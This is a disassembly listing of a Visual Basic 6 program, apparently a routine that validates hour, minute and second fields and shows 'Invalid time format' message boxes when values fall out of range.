007F5D1F: mov eax, [eax]
007F5D21: mov ecx, var_00000594
007F5D27: mov ecx, [ecx]
007F5D29: mov ecx, [ecx]
007F5D2B: push eax
007F5D2C: call [ecx+00000550h]
007F5D32: push eax
007F5D33: lea eax, var_70
007F5D36: push eax
007F5D37: call 00410A84h ; Set (object)
007F5D3C: push eax
007F5D3D: lea eax, var_00000094
007F5D43: push eax
007F5D44: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5D49: add esp, 00000010h
007F5D4C: push eax
007F5D4D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F5D52: push eax
007F5D53: lea eax, var_74
007F5D56: push eax
007F5D57: call 00410A84h ; Set (object)
007F5D5C: push eax
007F5D5D: lea eax, var_000000A4
007F5D63: push eax
007F5D64: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5D69: add esp, 00000020h
007F5D6C: push eax
007F5D6D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F5D72: push eax
007F5D73: lea eax, var_78
007F5D76: push eax
007F5D77: call 00410A84h ; Set (object)
007F5D7C: push eax
007F5D7D: lea eax, var_000000B4
007F5D83: push eax
007F5D84: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5D89: add esp, 00000010h
007F5D8C: push eax
007F5D8D: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F5D92: mov edx, eax
007F5D94: lea ecx, var_54
007F5D97: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F5D9C: push eax
007F5D9D: call 004109DCh ; Val(arg_1)
007F5DA2: fstp real8 ptr var_000001E4
007F5DA8: push 00000000h
007F5DAA: push 00000005h
007F5DAC: push 00000001h
007F5DAE: push 00000000h
007F5DB0: lea eax, var_00000148
007F5DB6: push eax
007F5DB7: push 00000010h
007F5DB9: push 00000880h
007F5DBE: call 00410946h ; ReDim
007F5DC3: add esp, 0000001Ch
007F5DC6: mov var_00000160, 00447594h
007F5DD0: mov var_00000168, 00000008h
007F5DDA: lea esi, var_00000168
007F5DE0: push 00000000h
007F5DE2: push var_00000148
007F5DE8: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5DED: mov ecx, eax
007F5DEF: mov edx, esi
007F5DF1: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F5DF6: mov eax, [ebp+08h]
007F5DF9: mov eax, [eax]
007F5DFB: push [ebp+08h]
007F5DFE: call [eax+00000344h]
007F5E04: mov var_000000BC, eax
007F5E0A: mov var_000000C4, 00000009h
007F5E14: lea esi, var_000000C4
007F5E1A: push 00000001h
007F5E1C: push var_00000148
007F5E22: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5E27: mov ecx, eax
007F5E29: mov edx, esi
007F5E2B: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5E30: mov eax, [ebp+08h]
007F5E33: mov eax, [eax]
007F5E35: push [ebp+08h]
007F5E38: call [eax+00000340h]
007F5E3E: mov var_000000CC, eax
007F5E44: mov var_000000D4, 00000009h
007F5E4E: lea esi, var_000000D4
007F5E54: push 00000002h
007F5E56: push var_00000148
007F5E5C: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5E61: mov ecx, eax
007F5E63: mov edx, esi
007F5E65: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5E6A: mov eax, [ebp+08h]
007F5E6D: mov eax, [eax]
007F5E6F: push [ebp+08h]
007F5E72: call [eax+0000033Ch]
007F5E78: mov var_000000DC, eax
007F5E7E: mov var_000000E4, 00000009h
007F5E88: lea esi, var_000000E4
007F5E8E: push 00000003h
007F5E90: push var_00000148
007F5E96: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5E9B: mov ecx, eax
007F5E9D: mov edx, esi
007F5E9F: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5EA4: lea eax, var_34
007F5EA7: mov var_00000170, eax
007F5EAD: mov var_00000178, 00004003h
007F5EB7: lea esi, var_00000178
007F5EBD: push 00000004h
007F5EBF: push var_00000148
007F5EC5: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5ECA: mov ecx, eax
007F5ECC: mov edx, esi
007F5ECE: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5ED3: lea eax, var_44
007F5ED6: mov var_00000180, eax
007F5EDC: mov var_00000188, 00004008h
007F5EE6: lea esi, var_00000188
007F5EEC: push 00000005h
007F5EEE: push var_00000148
007F5EF4: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5EF9: mov ecx, eax
007F5EFB: mov edx, esi
007F5EFD: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5F02: mov edx, 0043D464h ; x7
007F5F07: lea ecx, var_58
007F5F0A: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F5F0F: lea eax, var_00000148
007F5F15: push eax
007F5F16: lea eax, var_58
007F5F19: push eax
007F5F1A: fld real8 ptr var_000001E4
007F5F20: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F5F25: push eax
007F5F26: call 007A6910h
007F5F2B: lea eax, var_00000148
007F5F31: push eax
007F5F32: push 00000000h
007F5F34: call 00410934h ; Erase
007F5F39: lea eax, var_58
007F5F3C: push eax
007F5F3D: lea eax, var_54
007F5F40: push eax
007F5F41: push 00000002h
007F5F43: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F5F48: add esp, 0000000Ch
007F5F4B: lea eax, var_78
007F5F4E: push eax
007F5F4F: lea eax, var_74
007F5F52: push eax
007F5F53: lea eax, var_70
007F5F56: push eax
007F5F57: push 00000003h
007F5F59: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F5F5E: add esp, 00000010h
007F5F61: lea eax, var_000000B4
007F5F67: push eax
007F5F68: lea eax, var_000000A4
007F5F6E: push eax
007F5F6F: lea eax, var_00000094
007F5F75: push eax
007F5F76: push 00000003h
007F5F78: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F5F7D: add esp, 00000010h
007F5F80: mov var_04, 000000B2h
007F5F87: and word ptr [008F24A4h], 0000h
007F5F8F: mov var_04, 000000B5h
007F5F96: lea eax, var_000003A0
007F5F9C: push eax
007F5F9D: lea eax, var_00000390
007F5FA3: push eax
007F5FA4: lea eax, var_30
007F5FA7: push eax
007F5FA8: call 00410A36h ; Next
007F5FAD: mov var_000003E8, eax
007F5FB3: cmp var_000003E8, 00000000h
007F5FBA: jnz 007F56DFh
007F5FC0: mov var_04, 000000B7h
007F5FC7: or [008F2484h], FFFFFFFFh
007F5FCE: mov var_04, 000000B9h
007F5FD5: push 00000000h
007F5FD7: push 00000000h
007F5FD9: mov eax, [ebp+08h]
007F5FDC: mov eax, [eax]
007F5FDE: push [ebp+08h]
007F5FE1: call [eax+00000374h]
007F5FE7: push eax
007F5FE8: lea eax, var_70
007F5FEB: push eax
007F5FEC: call 00410A84h ; Set (object)
007F5FF1: push eax
007F5FF2: lea eax, var_00000094
007F5FF8: push eax
007F5FF9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5FFE: add esp, 00000010h
007F6001: push eax
007F6002: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F6007: dec eax
007F6008: neg eax
007F600A: sbb eax, eax
007F600C: inc eax
007F600D: neg eax
007F600F: mov var_000001F0, ax
007F6016: lea ecx, var_70
007F6019: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F601E: lea ecx, var_00000094
007F6024: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F6029: movsx eax, word ptr var_000001F0
007F6030: test eax, eax
007F6032: jz 007F712Eh
007F6038: mov var_04, 000000BAh
007F603F: mov eax, [ebp+08h]
007F6042: mov eax, [eax]
007F6044: push [ebp+08h]
007F6047: call [eax+00000318h]
007F604D: push eax
007F604E: lea eax, var_70
007F6051: push eax
007F6052: call 00410A84h ; Set (object)
007F6057: mov var_000001F0, eax
007F605D: lea eax, var_74
007F6060: push eax
007F6061: push 00000002h
007F6063: mov eax, var_000001F0
007F6069: mov eax, [eax]
007F606B: push var_000001F0
007F6071: call [eax+40h]
007F6074: fclex 
007F6076: mov var_000001F4, eax
007F607C: cmp var_000001F4, 00000000h
007F6083: jnl 7F60A5h
007F6085: push 00000040h
007F6087: push 00440DE8h
007F608C: push var_000001F0
007F6092: push var_000001F4
007F6098: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F609D: mov var_00000598, eax
007F60A3: jmp 7F60ACh
007F60A5: and var_00000598, 00000000h
007F60AC: mov eax, var_74
007F60AF: mov var_000001F8, eax
007F60B5: lea eax, var_54
007F60B8: push eax
007F60B9: mov eax, var_000001F8
007F60BF: mov eax, [eax]
007F60C1: push var_000001F8
007F60C7: call [eax+000000A0h]
007F60CD: fclex 
007F60CF: mov var_000001FC, eax
007F60D5: cmp var_000001FC, 00000000h
007F60DC: jnl 7F6101h
007F60DE: push 000000A0h
007F60E3: push 00440E08h
007F60E8: push var_000001F8
007F60EE: push var_000001FC
007F60F4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F60F9: mov var_0000059C, eax
007F60FF: jmp 7F6108h
007F6101: and var_0000059C, 00000000h
007F6108: push var_54
007F610B: call 004109DCh ; Val(arg_1)
007F6110: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F6115: fcomp real8 ptr [00401770h]
007F611B: fstsw ax
007F611D: sahf 
007F611E: jnb 7F612Ch
007F6120: mov var_000005A0, 00000001h
007F612A: jmp 7F6133h
007F612C: and var_000005A0, 00000000h
007F6133: mov eax, [ebp+08h]
007F6136: mov eax, [eax]
007F6138: push [ebp+08h]
007F613B: call [eax+00000318h]
007F6141: push eax
007F6142: lea eax, var_78
007F6145: push eax
007F6146: call 00410A84h ; Set (object)
007F614B: mov var_00000200, eax
007F6151: lea eax, var_7C
007F6154: push eax
007F6155: push 00000002h
007F6157: mov eax, var_00000200
007F615D: mov eax, [eax]
007F615F: push var_00000200
007F6165: call [eax+40h]
007F6168: fclex 
007F616A: mov var_00000204, eax
007F6170: cmp var_00000204, 00000000h
007F6177: jnl 7F6199h
007F6179: push 00000040h
007F617B: push 00440DE8h
007F6180: push var_00000200
007F6186: push var_00000204
007F618C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6191: mov var_000005A4, eax
007F6197: jmp 7F61A0h
007F6199: and var_000005A4, 00000000h
007F61A0: mov eax, var_7C
007F61A3: mov var_00000208, eax
007F61A9: lea eax, var_58
007F61AC: push eax
007F61AD: mov eax, var_00000208
007F61B3: mov eax, [eax]
007F61B5: push var_00000208
007F61BB: call [eax+000000A0h]
007F61C1: fclex 
007F61C3: mov var_0000020C, eax
007F61C9: cmp var_0000020C, 00000000h
007F61D0: jnl 7F61F5h
007F61D2: push 000000A0h
007F61D7: push 00440E08h
007F61DC: push var_00000208
007F61E2: push var_0000020C
007F61E8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F61ED: mov var_000005A8, eax
007F61F3: jmp 7F61FCh
007F61F5: and var_000005A8, 00000000h
007F61FC: push var_58
007F61FF: call 004109DCh ; Val(arg_1)
007F6204: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F6209: fcomp real8 ptr [00409FF8h]
007F620F: fstsw ax
007F6211: sahf 
007F6212: jbe 7F6220h
007F6214: mov var_000005AC, 00000001h
007F621E: jmp 7F6227h
007F6220: and var_000005AC, 00000000h
007F6227: mov eax, var_000005A0
007F622D: neg eax
007F622F: mov ecx, var_000005AC
007F6235: neg ecx
007F6237: or ax, cx
007F623A: mov var_00000210, ax
007F6241: lea eax, var_58
007F6244: push eax
007F6245: lea eax, var_54
007F6248: push eax
007F6249: push 00000002h
007F624B: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F6250: add esp, 0000000Ch
007F6253: lea eax, var_7C
007F6256: push eax
007F6257: lea eax, var_78
007F625A: push eax
007F625B: lea eax, var_74
007F625E: push eax
007F625F: lea eax, var_70
007F6262: push eax
007F6263: push 00000004h
007F6265: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F626A: add esp, 00000014h
007F626D: movsx eax, word ptr var_00000210
007F6274: test eax, eax
007F6276: jz 007F6332h
007F627C: mov var_04, 000000BBh
007F6283: mov var_000000BC, 80020004h
007F628D: mov var_000000C4, 0000000Ah
007F6297: mov var_000000AC, 80020004h
007F62A1: mov var_000000B4, 0000000Ah
007F62AB: mov var_0000009C, 80020004h
007F62B5: mov var_000000A4, 0000000Ah
007F62BF: mov var_00000150, 00450B54h ; Invalid time format in field: s
007F62C9: mov var_00000158, 00000008h
007F62D3: lea edx, var_00000158
007F62D9: lea ecx, var_00000094
007F62DF: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F62E4: lea eax, var_000000C4
007F62EA: push eax
007F62EB: lea eax, var_000000B4
007F62F1: push eax
007F62F2: lea eax, var_000000A4
007F62F8: push eax
007F62F9: push 00000010h
007F62FB: lea eax, var_00000094
007F6301: push eax
007F6302: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F6307: lea eax, var_000000C4
007F630D: push eax
007F630E: lea eax, var_000000B4
007F6314: push eax
007F6315: lea eax, var_000000A4
007F631B: push eax
007F631C: lea eax, var_00000094
007F6322: push eax
007F6323: push 00000004h
007F6325: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F632A: add esp, 00000014h
007F632D: jmp 007F712Eh
007F6332: mov var_04, 000000BEh
007F6339: mov eax, [ebp+08h]
007F633C: mov eax, [eax]
007F633E: push [ebp+08h]
007F6341: call [eax+00000318h]
007F6347: push eax
007F6348: lea eax, var_70
007F634B: push eax
007F634C: call 00410A84h ; Set (object)
007F6351: mov var_000001F0, eax
007F6357: lea eax, var_74
007F635A: push eax
007F635B: push 00000001h
007F635D: mov eax, var_000001F0
007F6363: mov eax, [eax]
007F6365: push var_000001F0
007F636B: call [eax+40h]
007F636E: fclex 
007F6370: mov var_000001F4, eax
007F6376: cmp var_000001F4, 00000000h
007F637D: jnl 7F639Fh
007F637F: push 00000040h
007F6381: push 00440DE8h
007F6386: push var_000001F0
007F638C: push var_000001F4
007F6392: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6397: mov var_000005B0, eax
007F639D: jmp 7F63A6h
007F639F: and var_000005B0, 00000000h
007F63A6: mov eax, var_74
007F63A9: mov var_000001F8, eax
007F63AF: lea eax, var_54
007F63B2: push eax
007F63B3: mov eax, var_000001F8
007F63B9: mov eax, [eax]
007F63BB: push var_000001F8
007F63C1: call [eax+000000A0h]
007F63C7: fclex 
007F63C9: mov var_000001FC, eax
007F63CF: cmp var_000001FC, 00000000h
007F63D6: jnl 7F63FBh
007F63D8: push 000000A0h
007F63DD: push 00440E08h
007F63E2: push var_000001F8
007F63E8: push var_000001FC
007F63EE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F63F3: mov var_000005B4, eax
007F63F9: jmp 7F6402h
007F63FB: and var_000005B4, 00000000h
007F6402: push var_54
007F6405: call 004109DCh ; Val(arg_1)
007F640A: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F640F: fcomp real8 ptr [00401770h]
007F6415: fstsw ax
007F6417: sahf 
007F6418: jnb 7F6426h
007F641A: mov var_000005B8, 00000001h
007F6424: jmp 7F642Dh
007F6426: and var_000005B8, 00000000h
007F642D: mov eax, [ebp+08h]
007F6430: mov eax, [eax]
007F6432: push [ebp+08h]
007F6435: call [eax+00000318h]
007F643B: push eax
007F643C: lea eax, var_78
007F643F: push eax
007F6440: call 00410A84h ; Set (object)
007F6445: mov var_00000200, eax
007F644B: lea eax, var_7C
007F644E: push eax
007F644F: push 00000001h
007F6451: mov eax, var_00000200
007F6457: mov eax, [eax]
007F6459: push var_00000200
007F645F: call [eax+40h]
007F6462: fclex 
007F6464: mov var_00000204, eax
007F646A: cmp var_00000204, 00000000h
007F6471: jnl 7F6493h
007F6473: push 00000040h
007F6475: push 00440DE8h
007F647A: push var_00000200
007F6480: push var_00000204
007F6486: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F648B: mov var_000005BC, eax
007F6491: jmp 7F649Ah
007F6493: and var_000005BC, 00000000h
007F649A: mov eax, var_7C
007F649D: mov var_00000208, eax
007F64A3: lea eax, var_58
007F64A6: push eax
007F64A7: mov eax, var_00000208
007F64AD: mov eax, [eax]
007F64AF: push var_00000208
007F64B5: call [eax+000000A0h]
007F64BB: fclex 
007F64BD: mov var_0000020C, eax
007F64C3: cmp var_0000020C, 00000000h
007F64CA: jnl 7F64EFh
007F64CC: push 000000A0h
007F64D1: push 00440E08h
007F64D6: push var_00000208
007F64DC: push var_0000020C
007F64E2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F64E7: mov var_000005C0, eax
007F64ED: jmp 7F64F6h
007F64EF: and var_000005C0, 00000000h
007F64F6: push var_58
007F64F9: call 004109DCh ; Val(arg_1)
007F64FE: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F6503: fcomp real8 ptr [00409FF8h]
007F6509: fstsw ax
007F650B: sahf 
007F650C: jbe 7F651Ah
007F650E: mov var_000005C4, 00000001h
007F6518: jmp 7F6521h
007F651A: and var_000005C4, 00000000h
007F6521: mov eax, var_000005B8
007F6527: neg eax
007F6529: mov ecx, var_000005C4
007F652F: neg ecx
007F6531: or ax, cx
007F6534: mov var_00000210, ax
007F653B: lea eax, var_58
007F653E: push eax
007F653F: lea eax, var_54
007F6542: push eax
007F6543: push 00000002h
007F6545: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F654A: add esp, 0000000Ch
007F654D: lea eax, var_7C
007F6550: push eax
007F6551: lea eax, var_78
007F6554: push eax
007F6555: lea eax, var_74
007F6558: push eax
007F6559: lea eax, var_70
007F655C: push eax
007F655D: push 00000004h
007F655F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F6564: add esp, 00000014h
007F6567: movsx eax, word ptr var_00000210
007F656E: test eax, eax
007F6570: jz 007F662Ch
007F6576: mov var_04, 000000BFh
007F657D: mov var_000000BC, 80020004h
007F6587: mov var_000000C4, 0000000Ah
007F6591: mov var_000000AC, 80020004h
007F659B: mov var_000000B4, 0000000Ah
007F65A5: mov var_0000009C, 80020004h
007F65AF: mov var_000000A4, 0000000Ah
007F65B9: mov var_00000150, 00450B98h ; Invalid time format in field: m
007F65C3: mov var_00000158, 00000008h
007F65CD: lea edx, var_00000158
007F65D3: lea ecx, var_00000094
007F65D9: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F65DE: lea eax, var_000000C4
007F65E4: push eax
007F65E5: lea eax, var_000000B4
007F65EB: push eax
007F65EC: lea eax, var_000000A4
007F65F2: push eax
007F65F3: push 00000010h
007F65F5: lea eax, var_00000094
007F65FB: push eax
007F65FC: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F6601: lea eax, var_000000C4
007F6607: push eax
007F6608: lea eax, var_000000B4
007F660E: push eax
007F660F: lea eax, var_000000A4
007F6615: push eax
007F6616: lea eax, var_00000094
007F661C: push eax
007F661D: push 00000004h
007F661F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F6624: add esp, 00000014h
007F6627: jmp 007F712Eh
007F662C: mov var_04, 000000C2h
007F6633: mov eax, [ebp+08h]
007F6636: mov eax, [eax]
007F6638: push [ebp+08h]
007F663B: call [eax+00000318h]
007F6641: push eax
007F6642: lea eax, var_70
007F6645: push eax
007F6646: call 00410A84h ; Set (object)
007F664B: mov var_000001F0, eax
007F6651: lea eax, var_74
007F6654: push eax
007F6655: push 00000000h
007F6657: mov eax, var_000001F0
007F665D: mov eax, [eax]
007F665F: push var_000001F0
007F6665: call [eax+40h]
007F6668: fclex 
007F666A: mov var_000001F4, eax
007F6670: cmp var_000001F4, 00000000h
007F6677: jnl 7F6699h
007F6679: push 00000040h
007F667B: push 00440DE8h
007F6680: push var_000001F0
007F6686: push var_000001F4
007F668C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6691: mov var_000005C8, eax
007F6697: jmp 7F66A0h
007F6699: and var_000005C8, 00000000h
007F66A0: mov eax, var_74
007F66A3: mov var_000001F8, eax
007F66A9: lea eax, var_54
007F66AC: push eax
007F66AD: mov eax, var_000001F8
007F66B3: mov eax, [eax]
007F66B5: push var_000001F8
007F66BB: call [eax+000000A0h]
007F66C1: fclex 
007F66C3: mov var_000001FC, eax
007F66C9: cmp var_000001FC, 00000000h
007F66D0: jnl 7F66F5h
007F66D2: push 000000A0h
007F66D7: push 00440E08h
007F66DC: push var_000001F8
007F66E2: push var_000001FC
007F66E8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F66ED: mov var_000005CC, eax
007F66F3: jmp 7F66FCh
007F66F5: and var_000005CC, 00000000h
007F66FC: push var_54
007F66FF: call 004109DCh ; Val(arg_1)
007F6704: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F6709: fcomp real8 ptr [00401770h]
007F670F: fstsw ax
007F6711: sahf 
007F6712: jnb 7F6720h
007F6714: mov var_000005D0, 00000001h
007F671E: jmp 7F6727h
007F6720: and var_000005D0, 00000000h
007F6727: mov eax, [ebp+08h]
007F672A: mov eax, [eax]
007F672C: push [ebp+08h]
007F672F: call [eax+00000318h]
007F6735: push eax
007F6736: lea eax, var_78
007F6739: push eax
007F673A: call 00410A84h ; Set (object)
007F673F: mov var_00000200, eax
007F6745: lea eax, var_7C
007F6748: push eax
007F6749: push 00000000h
007F674B: mov eax, var_00000200
007F6751: mov eax, [eax]
007F6753: push var_00000200
007F6759: call [eax+40h]
007F675C: fclex 
007F675E: mov var_00000204, eax
007F6764: cmp var_00000204, 00000000h
007F676B: jnl 7F678Dh
007F676D: push 00000040h
007F676F: push 00440DE8h
007F6774: push var_00000200
007F677A: push var_00000204
007F6780: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6785: mov var_000005D4, eax
007F678B: jmp 7F6794h
007F678D: and var_000005D4, 00000000h
007F6794: mov eax, var_7C
007F6797: mov var_00000208, eax
007F679D: lea eax, var_58
007F67A0: push eax
007F67A1: mov eax, var_00000208
007F67A7: mov eax, [eax]
007F67A9: push var_00000208
007F67AF: call [eax+000000A0h]
007F67B5: fclex 
007F67B7: mov var_0000020C, eax
007F67BD: cmp var_0000020C, 00000000h
007F67C4: jnl 7F67E9h
007F67C6: push 000000A0h
007F67CB: push 00440E08h
007F67D0: push var_00000208
007F67D6: push var_0000020C
007F67DC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F67E1: mov var_000005D8, eax
007F67E7: jmp 7F67F0h
007F67E9: and var_000005D8, 00000000h
007F67F0: push var_58
007F67F3: call 004109DCh ; Val(arg_1)
007F67F8: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F67FD: fcomp real8 ptr [00409FF0h]
007F6803: fstsw ax
007F6805: sahf 
007F6806: jbe 7F6814h
007F6808: mov var_000005DC, 00000001h
007F6812: jmp 7F681Bh
007F6814: and var_000005DC, 00000000h
007F681B: mov eax, var_000005D0
007F6821: neg eax
007F6823: mov ecx, var_000005DC
007F6829: neg ecx
007F682B: or ax, cx
007F682E: mov var_00000210, ax
007F6835: lea eax, var_58
007F6838: push eax
007F6839: lea eax, var_54
007F683C: push eax
007F683D: push 00000002h
007F683F: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F6844: add esp, 0000000Ch
007F6847: lea eax, var_7C
007F684A: push eax
007F684B: lea eax, var_78
007F684E: push eax
007F684F: lea eax, var_74
007F6852: push eax
007F6853: lea eax, var_70
007F6856: push eax
007F6857: push 00000004h
007F6859: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F685E: add esp, 00000014h
007F6861: movsx eax, word ptr var_00000210
007F6868: test eax, eax
007F686A: jz 007F6926h
007F6870: mov var_04, 000000C3h
007F6877: mov var_000000BC, 80020004h
007F6881: mov var_000000C4, 0000000Ah
007F688B: mov var_000000AC, 80020004h
007F6895: mov var_000000B4, 0000000Ah
007F689F: mov var_0000009C, 80020004h
007F68A9: mov var_000000A4, 0000000Ah
007F68B3: mov var_00000150, 00450B98h ; Invalid time format in field: m
007F68BD: mov var_00000158, 00000008h
007F68C7: lea edx, var_00000158
007F68CD: lea ecx, var_00000094
007F68D3: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F68D8: lea eax, var_000000C4
007F68DE: push eax
007F68DF: lea eax, var_000000B4
007F68E5: push eax
007F68E6: lea eax, var_000000A4
007F68EC: push eax
007F68ED: push 00000010h
007F68EF: lea eax, var_00000094
007F68F5: push eax
007F68F6: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F68FB: lea eax, var_000000C4
007F6901: push eax
007F6902: lea eax, var_000000B4
007F6908: push eax
007F6909: lea eax, var_000000A4
007F690F: push eax
007F6910: lea eax, var_00000094
007F6916: push eax
007F6917: push 00000004h
007F6919: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F691E: add esp, 00000014h
007F6921: jmp 007F712Eh
007F6926: mov var_04, 000000C6h
007F692D: mov eax, [ebp+08h]
007F6930: mov eax, [eax]
007F6932: push [ebp+08h]
007F6935: call [eax+00000318h]
007F693B: push eax
007F693C: lea eax, var_70
007F693F: push eax
007F6940: call 00410A84h ; Set (object)
007F6945: mov var_000001F0, eax
007F694B: lea eax, var_74
007F694E: push eax
007F694F: push 00000000h
007F6951: mov eax, var_000001F0
007F6957: mov eax, [eax]
007F6959: push var_000001F0
007F695F: call [eax+40h]
007F6962: fclex 
007F6964: mov var_000001F4, eax
007F696A: cmp var_000001F4, 00000000h
007F6971: jnl 7F6993h
007F6973: push 00000040h
007F6975: push 00440DE8h
007F697A: push var_000001F0
007F6980: push var_000001F4
007F6986: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F698B: mov var_000005E0, eax
007F6991: jmp 7F699Ah
007F6993: and var_000005E0, 00000000h
007F699A: mov eax, var_74
007F699D: mov var_000001F8, eax
007F69A3: lea eax, var_54
007F69A6: push eax
007F69A7: mov eax, var_000001F8
007F69AD: mov eax, [eax]
007F69AF: push var_000001F8
007F69B5: call [eax+000000A0h]
007F69BB: fclex 
007F69BD: mov var_000001FC, eax
007F69C3: cmp var_000001FC, 00000000h
007F69CA: jnl 7F69EFh
007F69CC: push 000000A0h
007F69D1: push 00440E08h
007F69D6: push var_000001F8
007F69DC: push var_000001FC
007F69E2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F69E7: mov var_000005E4, eax
007F69ED: jmp 7F69F6h
007F69EF: and var_000005E4, 00000000h
007F69F6: push var_54
007F69F9: call 004109DCh ; Val(arg_1)
007F69FE: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F6A03: fcomp real8 ptr [00401770h]
007F6A09: fstsw ax
007F6A0B: sahf 
007F6A0C: jnz 7F6A1Ah
007F6A0E: mov var_000005E8, 00000001h
007F6A18: jmp 7F6A21h
007F6A1A: and var_000005E8, 00000000h
007F6A21: mov eax, [ebp+08h]
007F6A24: mov eax, [eax]
007F6A26: push [ebp+08h]
007F6A29: call [eax+00000318h]
007F6A2F: push eax
007F6A30: lea eax, var_78
007F6A33: push eax
007F6A34: call 00410A84h ; Set (object)
007F6A39: mov var_00000200, eax
007F6A3F: lea eax, var_7C
007F6A42: push eax
007F6A43: push 00000001h
007F6A45: mov eax, var_00000200
007F6A4B: mov eax, [eax]
007F6A4D: push var_00000200
007F6A53: call [eax+40h]
007F6A56: fclex 
007F6A58: mov var_00000204, eax
007F6A5E: cmp var_00000204, 00000000h
007F6A65: jnl 7F6A87h
007F6A67: push 00000040h
007F6A69: push 00440DE8h
007F6A6E: push var_00000200
007F6A74: push var_00000204
007F6A7A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6A7F: mov var_000005EC, eax
007F6A85: jmp 7F6A8Eh
007F6A87: and var_000005EC, 00000000h
007F6A8E: mov eax, var_7C
007F6A91: mov var_00000208, eax
007F6A97: lea eax, var_58
007F6A9A: push eax
007F6A9B: mov eax, var_00000208
007F6AA1: mov eax, [eax]
007F6AA3: push var_00000208
007F6AA9: call [eax+000000A0h]
007F6AAF: fclex 
007F6AB1: mov var_0000020C, eax
007F6AB7: cmp var_0000020C, 00000000h
007F6ABE: jnl 7F6AE3h
007F6AC0: push 000000A0h
007F6AC5: push 00440E08h
007F6ACA: push var_00000208
007F6AD0: push var_0000020C
007F6AD6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F6ADB: mov var_000005F0, eax
007F6AE1: jmp 7F6AEAh
007F6AE3: and var_000005F0, 00000000h
007F6AEA: push var_58
007F6AED: call 004109DCh ; Val(arg_1)
007F6AF2: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F6AF7: fcomp real8 ptr [00401770h]
007F6AFD: fstsw ax
007F6AFF: sahf 
007F6B00: jnz 7F6B0Eh
007F6B02: mov var_000005F4, 00000001h
007F6B0C: jmp 7F6B15h
007F6B0E: and var_000005F4, 00000000h
007F6B15: mov eax, [ebp+08h]
007F6B18: mov eax, [eax]
007F6B1A: push [ebp+08h]
007F6B1D: call [eax+00000318h]
007F6B23: push eax
007F6B24: lea eax, var_80
007F6B27: push eax
007F6B28: call 00410A84h ; Set (object)
007F6B2D: mov var_00000210, eax
007F6B33: lea eax, var_00000084
007F6B39: push eax
007F6B3A: push 00000002h
007F6B3C: mov eax, var_00000210
007F6B42: mov eax, [eax]
007F6B44: push var_00000210
007F6B4A: call [eax+40h]
007F6B4D: fclex 
007F6B4F: mov var_00000214, eax
007F6B55: cmp var_00000214, 00000000h
